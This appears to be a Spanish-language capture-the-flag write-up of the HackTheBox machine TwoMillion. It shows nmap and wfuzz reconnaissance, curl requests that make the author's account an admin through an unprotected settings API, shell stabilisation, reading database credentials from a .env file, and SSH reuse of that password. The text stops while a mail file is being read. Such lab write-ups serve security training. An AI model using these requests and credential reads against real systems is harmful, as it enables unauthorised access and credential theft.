<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">HackTheBox - TwoMillion | noname</title>
<meta property="og:title" content="HackTheBox - TwoMillion | noname" />
<meta name="twitter:title" content="HackTheBox - TwoMillion | noname" />
<meta itemprop="name" content="HackTheBox - TwoMillion | noname" />
<meta name="application-name" content="HackTheBox - TwoMillion | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup TwoMillion üü¢">
<meta itemprop="description" content="Writeup TwoMillion üü¢" />
<meta property="og:description" content="Writeup TwoMillion üü¢" />
<meta name="twitter:description" content="Writeup TwoMillion üü¢" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/htb/2million/" title="" />



  <meta itemprop="image" content="https://0x-noname.github.io/machines/htb/2million/2million_logo.webp" />
  <meta property="og:image" content="https://0x-noname.github.io/machines/htb/2million/2million_logo.webp" />
  <meta name="twitter:image" content="https://0x-noname.github.io/machines/htb/2million/2million_logo.webp" />
  <meta name="twitter:image:src" content="https://0x-noname.github.io/machines/htb/2million/2million_logo.webp" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-09-01T15:30:15&#43;0200 />
    <meta property="article:published_time" content=2023-09-01T15:30:15&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "HackTheBox - TwoMillion",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-09-01",
        "description": "Writeup TwoMillion üü¢",
        "wordCount":  1017 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-09-01",
        "image": {
        "@type": "imageObject",
        "url": "\/machines\/htb\/2million\/2million_logo.webp"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>



<meta name="generator" content="Hugo 0.125.7">

    

    <link rel="canonical" href="https://0x-noname.github.io/writeups/htb/2million/">
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
  

</head>
<body data-theme = "" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://0x-noname.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">HackTheBox - TwoMillion</h1>
                
                
                <div class="post-meta">
                    <time datetime="2023-09-01T15:30:15&#43;02:00" itemprop="datePublished"> Sep 1, 2023 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/../machines/htb/2million/2million_logo.webp" alt="logo"></p>
<ul>
<li><em>HackTheBox Invite Code Challenge</em></li>
<li><em>Discovering API Routes</em></li>
<li><em>Command Injection - RCE</em></li>
<li><em>Re-using the database password</em></li>
<li><em>(Overlay FS) - Privilege escalation</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -p- -T5 -n -v 10.10.11.221
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -sVC -v -p 22,80 10.10.11.221
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp open  http    nginx
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://2million.htb/
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h4 id="http-tcp---80">HTTP TCP - 80</h4>
<p><img src="/../machines/htb/2million/http.webp" alt="http"></p>
<p>Agrego el dominio <code>2million.htb</code> a mi archivo hosts.</p>
<p><img src="/../machines/htb/2million/http-2million.webp" alt="http-2million"></p>
<p>Realizo fuerza bruta de directorios.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ wfuzz -t 100 -c --hl=7 -w /usr/share/seclists/Discovery/Web-Content/big.txt http://2million.htb/FUZZ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Target: http://2million.htb/FUZZ
</span></span><span class="line"><span class="cl">Total requests: 20476
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">=====================================================================
</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
</span></span><span class="line"><span class="cl">=====================================================================
</span></span><span class="line"><span class="cl">                                                                                                                                          
</span></span><span class="line"><span class="cl">000002431:   401        0 L      0 W        0 Ch        &#34;api&#34;                                                                                                                                           
</span></span><span class="line"><span class="cl">000008957:   302        0 L      0 W        0 Ch        &#34;home&#34;                                                                                                                                          
</span></span><span class="line"><span class="cl">000009833:   200        96 L     285 W      3859 Ch     &#34;invite&#34;                                                                                                                                        
</span></span><span class="line"><span class="cl">000011057:   200        80 L     232 W      3704 Ch     &#34;login&#34;                                                                                                                                         
</span></span><span class="line"><span class="cl">000011080:   302        0 L      0 W        0 Ch        &#34;logout&#34;                                                                                                                                        
</span></span><span class="line"><span class="cl">000015176:   200        94 L     293 W      4527 Ch     &#34;register&#34; 
</span></span></code></pre></div><p>Doy click en <strong>invite</strong> y me sale el cl√°sico formulario de invitaci√≥n de <strong>htb</strong> que antiguamente serv√≠a para <strong>registrarse</strong> en la plataforma si consegu√≠as generar un <code>c√≥digo de invitaci√≥n</code>.</p>
<p><img src="/../machines/htb/2million/invite.webp" alt="invite"></p>
<p>Abro el inspector de elementos, me voy al depurador y selecciono <code>inviteapi.min.js</code>.</p>
<p><img src="/../machines/htb/2million/depurador.webp" alt="depurador"></p>
<p>Desde la consola del navegador genero una invitaci√≥n pero esta codificada en ROT13</p>
<p><img src="/../machines/htb/2million/console3.webp" alt="console3"></p>
<p>Decodifico la data en cyberchef.</p>
<p><img src="/../machines/htb/2million/cyberchef.webp" alt="cyberchef"></p>
<p>Como bien me indica realizo una solicitud POST a <code>/api/v1/invite/generate</code> para generar un c√≥digo de invitaci√≥n.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">‚ùØ</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="o">-</span><span class="nx">X</span> <span class="nx">POST</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//2million.htb/api/v1/invite/generate | jq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;0&#34;</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;success&#34;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;data&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;code&#34;</span><span class="o">:</span> <span class="s2">&#34;UE9PUVotR1g4VjQtWEhRM1YtTks3UkQ=&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;format&#34;</span><span class="o">:</span> <span class="s2">&#34;encoded&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Decodifico el c√≥digo en base64 y finalmente obtengo el c√≥digo de invitaci√≥n.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ echo &#34;UE9PUVotR1g4VjQtWEhRM1YtTks3UkQ=&#34; | base64 -d;echo
</span></span><span class="line"><span class="cl">POOQZ-GX8V4-XHQ3V-NK7RD
</span></span></code></pre></div><p>Introduzco el c√≥digo de invitaci√≥n.</p>
<p><img src="/../machines/htb/2million/c%C3%B3digoInv.webp" alt="c√≥digoInv"></p>
<p>Me registro.</p>
<p><img src="/../machines/htb/2million/registro.webp" alt="registro"></p>
<p>Accedo al dashboard.</p>
<p><img src="/../machines/htb/2million/noname_dashboard.webp" alt="noname_dashboard"></p>
<p>Haciendo hovering encuentro que en access es el √∫nico sitio donde puedo hacer click.</p>
<p><img src="/../machines/htb/2million/access.webp" alt="access"></p>
<p>Lanzo burpsuite y capturo la petici√≥n de <code>Regenerate</code> y la mando al repeater.</p>
<p><img src="/../machines/htb/2million/regenerate.webp" alt="regenerate"></p>
<p>Enumerando entre directorios en <code>/api/user</code> encuentro detalles de la API completa.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">‚ùØ</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//2million.htb/api/v1 -H &#34;Cookie: PHPSESSID=o42kq37cra0c4soal569lsvrth&#34; | jq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;v1&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;user&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;GET&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1&#34;</span><span class="o">:</span> <span class="s2">&#34;Route List&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/invite/how/to/generate&#34;</span><span class="o">:</span> <span class="s2">&#34;Instructions on invite code generation&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/invite/generate&#34;</span><span class="o">:</span> <span class="s2">&#34;Generate invite code&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/invite/verify&#34;</span><span class="o">:</span> <span class="s2">&#34;Verify invite code&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/auth&#34;</span><span class="o">:</span> <span class="s2">&#34;Check if user is authenticated&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/vpn/generate&#34;</span><span class="o">:</span> <span class="s2">&#34;Generate a new VPN configuration&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/vpn/regenerate&#34;</span><span class="o">:</span> <span class="s2">&#34;Regenerate VPN configuration&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/vpn/download&#34;</span><span class="o">:</span> <span class="s2">&#34;Download OVPN file&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;POST&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/register&#34;</span><span class="o">:</span> <span class="s2">&#34;Register a new user&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/login&#34;</span><span class="o">:</span> <span class="s2">&#34;Login with existing user&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;admin&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;GET&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/admin/auth&#34;</span><span class="o">:</span> <span class="s2">&#34;Check if user is admin&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;POST&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/admin/vpn/generate&#34;</span><span class="o">:</span> <span class="s2">&#34;Generate VPN for specific user&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;PUT&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/admin/settings/update&#34;</span><span class="o">:</span> <span class="s2">&#34;Update user settings&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Verifico si soy usuario admin con <code>/api/v1/admin/auth</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">‚ùØ</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//2million.htb/api/v1/admin/auth -H &#34;Cookie: PHPSESSID=o42kq37cra0c4soal569lsvrth&#34; | jq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;message&#34;</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Intento generar una vpn con <code>/api/v1/admin/vpn/generate</code> mediante el m√©todo <strong>POST</strong> pero al no ser admin no tengo permisos.</p>
<p><img src="/../machines/htb/2million/api_post_admin_generate_vpn.webp" alt="api_post_admin_generate_vpn"></p>
<p>Al probar el m√©todo <strong>PUT</strong> veo el mensaje <code>Invalid content type</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">‚ùØ</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="o">-</span><span class="nx">X</span> <span class="nx">PUT</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//2million.htb/api/v1/admin/settings/update -H &#34;Cookie: PHPSESSID=o42kq37cra0c4soal569lsvrth&#34; | jq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;status&#34;</span><span class="o">:</span> <span class="s2">&#34;danger&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;message&#34;</span><span class="o">:</span> <span class="s2">&#34;Invalid content type.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Le a√±ado el <code>content type</code> pero ahora no encuentra el parametro <code>email</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">‚ùØ</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="o">-</span><span class="nx">X</span> <span class="nx">PUT</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//2million.htb/api/v1/admin/settings/update -H &#34;Cookie: PHPSESSID=o42kq37cra0c4soal569lsvrth&#34; -H &#34;Content-Type:application/json&#34; | jq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;status&#34;</span><span class="o">:</span> <span class="s2">&#34;danger&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;message&#34;</span><span class="o">:</span> <span class="s2">&#34;Missing parameter: email&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Le a√±ado el par√°metro <code>email</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">‚ùØ</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="o">-</span><span class="nx">X</span> <span class="nx">PUT</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//2million.htb/api/v1/admin/settings/update -H &#34;Cookie: PHPSESSID=o42kq37cra0c4soal569lsvrth&#34; -H &#34;Content-Type:application/json&#34; -d &#39;{&#34;email&#34;:&#34;noname@mail.com&#34;}&#39; | jq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;status&#34;</span><span class="o">:</span> <span class="s2">&#34;danger&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;message&#34;</span><span class="o">:</span> <span class="s2">&#34;Missing parameter: is_admin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Finalmente le agrego el par√°metro <code>is_admin</code> y me responde que el <code>id 15</code> con el nombre de usuario <strong>noname</strong> es <strong>administrador</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">‚ùØ</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="o">-</span><span class="nx">X</span> <span class="nx">PUT</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//2million.htb/api/v1/admin/settings/update -H &#34;Cookie: PHPSESSID=o42kq37cra0c4soal569lsvrth&#34; -H &#34;Content-Type:application/json&#34; -d &#39;{&#34;email&#34;:&#34;noname@mail.com&#34;,&#34;is_admin&#34;:1}&#39; | jq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="mi">15</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;username&#34;</span><span class="o">:</span> <span class="s2">&#34;noname&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;is_admin&#34;</span><span class="o">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Verifico si soy administrador.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">‚ùØ</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//2million.htb/api/v1/admin/auth -H &#34;Cookie: PHPSESSID=o42kq37cra0c4soal569lsvrth&#34; | jq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;message&#34;</span><span class="o">:</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Despu√©s de una pruebas veo que puedo inyectar comandos.</p>
<p><img src="/../machines/htb/2million/commnad_injection.webp" alt="commnad_injection"></p>
<p>Me mando una shell.</p>
<p><img src="/../machines/htb/2million/rshell.webp" alt="rshell"></p>
<p>Realizo el tratamiento de la tty.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@2million:~/html$ tty
</span></span><span class="line"><span class="cl">not a tty
</span></span><span class="line"><span class="cl">www-data@2million:~/html$ script /dev/null -c bash
</span></span><span class="line"><span class="cl">ctrl + Z
</span></span><span class="line"><span class="cl">stty raw -echo;fg
</span></span><span class="line"><span class="cl">reset
</span></span><span class="line"><span class="cl">xterm
</span></span><span class="line"><span class="cl">export TERM=xterm
</span></span><span class="line"><span class="cl">export SHELL=bash
</span></span><span class="line"><span class="cl">stty rows 50 columns 200
</span></span></code></pre></div><p>En el archivo <code>.env</code> encuentro unas credenciales.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@2million:~/html$ cat .env
</span></span><span class="line"><span class="cl">DB_HOST=127.0.0.1
</span></span><span class="line"><span class="cl">DB_DATABASE=htb_prod
</span></span><span class="line"><span class="cl">DB_USERNAME=admin
</span></span><span class="line"><span class="cl">DB_PASSWORD=S*************123
</span></span></code></pre></div><p>Me conecto al sistema como admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ssh admin@10.10.11.221
</span></span><span class="line"><span class="cl">admin@10.10.11.221&#39;s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Fri Sep  1 05:31:02 PM UTC 2023
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:           0.0087890625
</span></span><span class="line"><span class="cl">  Usage of /:            79.1% of 4.82GB
</span></span><span class="line"><span class="cl">  Memory usage:          14%
</span></span><span class="line"><span class="cl">  Swap usage:            0%
</span></span><span class="line"><span class="cl">admin@2million:~$ 
</span></span></code></pre></div><p>Enumero el sistema en busca de todo lo relacionado con el usuario admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">admin@2million:~$ find / -user admin 2&gt;/dev/null | grep -v -i -E &#39;proc|sys|dev|run&#39;
</span></span><span class="line"><span class="cl">/home/admin
</span></span><span class="line"><span class="cl">/home/admin/.cache
</span></span><span class="line"><span class="cl">/home/admin/.cache/motd.legal-displayed
</span></span><span class="line"><span class="cl">/home/admin/.ssh
</span></span><span class="line"><span class="cl">/home/admin/.ssh/known_hosts.old
</span></span><span class="line"><span class="cl">/home/admin/.ssh/known_hosts
</span></span><span class="line"><span class="cl">/home/admin/.profile
</span></span><span class="line"><span class="cl">/home/admin/.bash_logout
</span></span><span class="line"><span class="cl">/home/admin/.bashrc
</span></span><span class="line"><span class="cl">/var/mail/admin
</span></span></code></pre></div><p>Leo el archivo admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">admin@2million:~$ cat /var/mail/admin
</span></span><span class="line"><span class="cl">From: ch4p &lt;ch4p@2million.htb&gt;
</span></span><span class="line"><span class="cl">To: admin &lt;admin@2million.htb&gt;
</span></span><span class="line"><span class="cl">Cc: g0blin &lt;g0blin@2million.htb&gt;
</span></span><span class="line"><span class="cl">Subject: Urgent: Patch System OS
</span></span><span class="line"><span class="cl">Date: Tue, 1 June 2023 10:45:22 -0700
</span></span><span class="line"><span class="cl">Message-ID: &lt;9876543210@2million.htb&gt;
</span></span><span class="line"><span class="cl">X-Mailer: ThunderMail Pro 5.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hey admin,
</span></span><span class="line"><span class="cl">
